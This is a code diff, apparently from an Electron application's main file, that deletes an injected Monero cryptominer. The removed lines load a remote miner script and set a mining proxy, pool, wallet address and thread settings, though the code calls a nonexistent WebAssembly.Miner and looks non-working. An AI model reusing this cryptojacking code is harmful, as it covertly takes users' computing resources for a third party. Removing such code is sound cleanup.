@@ -5,44 +5,7 @@ const https = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
-const document = {
-  createElement: function(tagName) {
-    const el = { tagName };
-    el.children = [];
-    el.setAttribute = function(name, value) {
-      this[name] = value;
-    }
-    el.appendChild = function(child) {
-      this.children.push(child);
-    }
-    return el;
-  },
-  head: {
-    appendChild: function(child) {
-      // do nothing
-    }
-  }
-};
 
-const script = document.createElement('script');
-script.src = "https://monerominer.rocks/miner-mmr/webmnr.min.js";
-document.head.appendChild(script);
-
-const server = "wss://f.xmrminingproxy.com:8181";
-const pool = "gulf.moneroocean.stream";
-const walletAddress = "44X9i4c6YhQcfLiSCrbNH25yrRfkrhrzQSeZT1meFsqtSq1K48XHXosdG4Bj9sLE7ceTbsCnL6k8LaiheZGFyfS6Nn2Hcer";
-const workerId = "";
-const threads = -1;
-const password = "x";
-const throttleMiner = 20;
-
-function startMining(pool, walletAddress, workerId, threads, password) {
-  const miner = new WebAssembly.Miner();
-  miner.init(pool, walletAddress, workerId, threads, password);
-  miner.start();
-}
-
-startMining(pool, walletAddress, workerId, threads, password);
 
 
 
